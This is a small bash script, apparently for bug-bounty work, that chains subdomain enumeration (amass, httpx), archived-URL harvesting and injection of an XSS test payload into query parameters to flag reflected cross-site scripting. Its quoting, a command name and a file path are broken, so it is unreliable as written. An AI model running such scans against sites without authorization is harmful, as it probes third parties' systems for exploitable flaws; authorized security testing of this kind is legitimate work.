#!usr/bin/bash

echo " My script ";

read -p "Enter domain name => " input
for i in ${input[@]}
do
echo "
.
.
.
scan started for $i
"

mkdir bugs/$i

echo "AMASS STARTED"
amass enum -passive -norecursive -noalts -d $i -o bugs/$i/domain.txt
cat bugs/$i/domain.txt | httpx -o bugs/$i/domainhttpx.txt

echo "waybackurls"
cat bugs/$i/domainhttpx.txt | waybackurl | tee -a bugs/$i/endpoint.txt

echo "xssFUZZ"
cat bugs/$i/endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a bugs/$i/xss_fuzz.txt

echo "finding"
cat xss_fuzz.txt | freq | tee -a possible_xss.txt

done
